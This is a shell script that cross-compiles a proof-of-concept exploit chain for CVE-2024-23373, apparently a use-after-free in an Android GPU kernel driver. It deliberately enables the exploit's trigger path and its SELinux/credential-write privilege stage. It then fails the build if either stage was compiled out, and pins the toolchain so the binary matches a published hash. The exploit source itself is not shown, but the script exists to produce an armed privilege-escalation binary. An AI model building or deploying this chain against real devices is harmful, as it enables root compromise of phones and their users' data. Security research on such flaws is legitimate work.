#!/bin/sh
# ZF8 CVE-2024-23373 chain PoC build (host cross-compile).
#
# CRITICAL: both -D flags are REQUIRED. The source defaults them to 0, and with
# V7_ENABLE_TRIGGER=0 the binary exits immediately with RC=2
# ("trigger path disabled in this build") — a silent no-op chain that looks
# like a failed exploit rather than a build error.
#   V7_ENABLE_TRIGGER=1    enables the trigger/chain path (source line ~2898)
#   V7_ENABLE_PRIV_WRITE=1 enables the SELinux/cred write stage (source ~6637)
#
# Verify after build: `strings <bin> | grep -c "trigger path disabled"` must be 0.
set -e
cd "$(dirname "$0")"
# The default output name is the one the launchers execute. Passing an argument
# overrides it. Keeping the default in sync with the launchers avoids the
# build-one-binary-run-another failure mode.
OUT=${1:-kgsl_23373_poc_main}
# Optional: the release verbs are off by default. Enable them when the run needs
# to exercise memory teardown: RELEASE_EXIT=1 ./build.sh <out>.
REL=${RELEASE_EXIT:-0}
# The scanner's retire-wait flag is passed explicitly rather than left to the
# source default. It decides whether a synchronisation point exists between
# submit and read-back. Measured 2026-10-02: with 0 the scan result differed
# between runs; with 1 it was self-consistent across runs. 1 is the shipping
# setting. The environment override stays so a single-variable A/B is possible.
RET=${ROSCAN_WAIT_RETIRE:-1}
# The published md5 only reproduces with this exact gcc: the binary is static,
# so the toolchain's glibc lands in it. Another version still produces a working
# binary, but with different bytes, so a mismatch is an error rather than a note.
# -dumpfullversion, not -dumpversion: Debian's gcc-12 answers "12" to the latter.
CC_BIN=${POC_CC:-aarch64-linux-gnu-gcc-12}
WANT_CC_VERSION=12.4.0
if ! command -v "$CC_BIN" >/dev/null 2>&1; then
    echo "BUILD ERROR: $CC_BIN not found. Install the aarch64 gcc $WANT_CC_VERSION package, or point POC_CC at an aarch64 cross gcc." >&2
    exit 1
fi
HAVE_CC_VERSION=$("$CC_BIN" -dumpfullversion 2>/dev/null || echo unknown)
if [ "$HAVE_CC_VERSION" != "$WANT_CC_VERSION" ] && [ -z "${POC_ALLOW_ANY_CC:-}" ]; then
    echo "BUILD ERROR: $CC_BIN is $HAVE_CC_VERSION, the published binary was built with $WANT_CC_VERSION, so the md5 will not match. Set POC_ALLOW_ANY_CC=1 to build with $HAVE_CC_VERSION anyway." >&2
    exit 1
fi
"$CC_BIN" -O2 -static \
    -DV7_ENABLE_TRIGGER=1 -DV7_ENABLE_PRIV_WRITE=1 -DV7_ENABLE_RELEASE_EXIT=$REL \
    -DROSCAN_WAIT_RETIRE=$RET \
    -o "$OUT" kgsl_23373_poc.c -lpthread -ldl
if strings "$OUT" | grep -q "trigger path disabled"; then
    echo "BUILD ERROR: trigger path compiled out (V7_ENABLE_TRIGGER missing)" >&2
    exit 1
fi
# The first check alone is not enough. A binary built without
# -DV7_ENABLE_PRIV_WRITE=1 does not print an error and exit; main falls through
# to uaf_pause() and parks forever, which looks identical to a watchdog park and
# gets misread as a chain failure.
if strings "$OUT" | grep -q "privilege-write stage disabled"; then
    echo "BUILD ERROR: privilege-write stage compiled out (V7_ENABLE_PRIV_WRITE missing)" >&2
    exit 1
fi
# The binary is not bit-reproducible, so print the three inputs that move the
# bytes: the toolchain (the static glibc lands in the binary), RELEASE_EXIT (the
# only variable build knob, it decides whether three release verbs exist), and
# the source md5 (line counts drift, the md5 does not).
echo "built: $OUT ($(stat -c %s "$OUT") bytes, md5 $(md5sum "$OUT" | cut -d' ' -f1))"
echo "  gcc        = $("$CC_BIN" --version | head -1)"
echo "  RELEASE_EXIT= ${REL}   (set RELEASE_EXIT=1 ./build.sh to enable)"
echo "  source_md5 = $(md5sum kgsl_23373_poc.c | cut -d' ' -f1)"
